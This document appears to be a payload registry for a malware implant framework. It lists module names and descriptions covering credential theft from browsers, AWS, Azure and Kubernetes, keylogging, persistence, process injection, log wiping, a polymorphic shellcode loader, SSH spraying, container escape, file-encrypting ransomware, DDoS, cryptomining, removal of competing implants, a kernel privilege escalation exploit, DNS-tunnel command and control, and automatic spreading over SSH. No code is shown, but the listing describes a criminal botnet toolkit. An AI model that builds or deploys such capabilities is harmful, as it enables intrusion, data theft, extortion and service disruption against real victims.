note: Payloads now built as native Go binaries. Each payload is available in-process via the payloads registry (internal/payloads/). Python files are kept for reference only.

payloads.name: sysrecon
payloads.desc: Full system enumeration

payloads.name: cloud_detector
payloads.desc: Detect cloud environment (AWS/Azure/GCP/DigitalOcean/Docker/K8s)

payloads.name: linpeas_light
payloads.desc: Lightweight Linux PEAS scanner (sudo perms, SUID, cron, capabilities, kernel exploits)

payloads.name: browserstealer
payloads.desc: Extract saved browser credentials, cookies, and history from Chrome/Firefox/Edge/Brave

payloads.name: hashdump
payloads.desc: Dump password hashes from /etc/shadow, SSH keys, browser creds

payloads.name: aws_cred_stealer
payloads.desc: Harvest AWS credentials from metadata endpoint, env vars, config files, disk

payloads.name: azure_cred_harvester
payloads.desc: Harvest Azure tokens/credentials from metadata, env, CLI config, Key Vaults

payloads.name: k8s_secret_stealer
payloads.desc: Extract K8s secrets, config files, service account tokens

payloads.name: keylogger
payloads.desc: Log keystrokes via xinput/test or showkey

payloads.name: screenshot
payloads.desc: Capture screen via import/xwd/scrot

payloads.name: persist_cron
payloads.desc: Establish persistence via cron, systemd timers, at jobs

payloads.name: process_inject
payloads.desc: Linux process injection via ptrace (requires root)

payloads.name: filehider
payloads.desc: Hide files via chattr, extended attributes, ACLs, timestomping

payloads.name: logcleaner
payloads.desc: Clean system logs (auth.log, syslog, journald, wtmp, btmp, bash_history)

payloads.name: polyloader
payloads.desc: Polymorphic XOR loader for shellcode execution

payloads.name: sshspray
payloads.desc: SSH credential spraying with goroutine worker pool

payloads.name: container_escape
payloads.desc: Container escape techniques (privileged check, cgroup mount, nsenter)

payloads.name: fileransom
payloads.desc: AES-256-GCM file encryption with ransom note

payloads.name: ddos
payloads.desc: Multi-method DDoS (HTTP, TLS, UDP, TCP, Slow POST, combo)

payloads.name: competitor_cleaner
payloads.desc: Detect and remove competing implants, backdoors, and miners

payloads.name: copyfail
payloads.desc: CVE-2026-31431 Copy Fail: Linux kernel LPE via AF_ALG page-cache corruption (kernels 4.14+)

payloads.name: dnstunnel
payloads.desc: DNS tunneling module for stealthy C2 communication

payloads.name: mine
payloads.desc: Monero (XMR) miner connecting to a stratum pool

payloads.name: autodeploy
payloads.desc: Auto-discover hosts via network scanning and deploy implants via SSH
